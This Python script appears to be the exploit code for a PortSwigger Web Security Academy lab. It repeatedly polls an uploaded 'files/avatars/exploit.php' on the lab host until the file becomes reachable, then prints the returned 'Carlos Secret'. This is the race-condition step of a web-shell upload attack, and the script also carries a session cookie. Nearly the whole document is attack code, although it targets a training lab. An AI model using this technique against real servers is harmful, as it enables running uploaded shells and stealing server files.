import requests

burp0_url = "https://0adb002304670705828b06dc003200d4.web-security-academy.net:443/"
burp0_cookies = {"session": "dsJditl6sbuuzIcYdozN7K3PlGZvCeH1"}
burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://portswigger.net/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Priority": "u=0, i"}
requests.get(burp0_url, headers=burp0_headers)








temp_url1 = burp0_url + "files/avatars/exploit.php"
print(f"checking location: => \n {temp_url1}")

def loop_reading():
	i=0
	while True:
		i +=1
		print(f"checked => {i} of times", end="\r")
		response_temp1 = requests.get(temp_url1, headers=burp0_headers, cookies=burp0_cookies)
		if b"404 Not Found" not in response_temp1.content:
			print(f"Carlos Secret is: => \n\n {response_temp1.content.decode()}")
			break

if __name__ == '__main__':
	loop_reading()			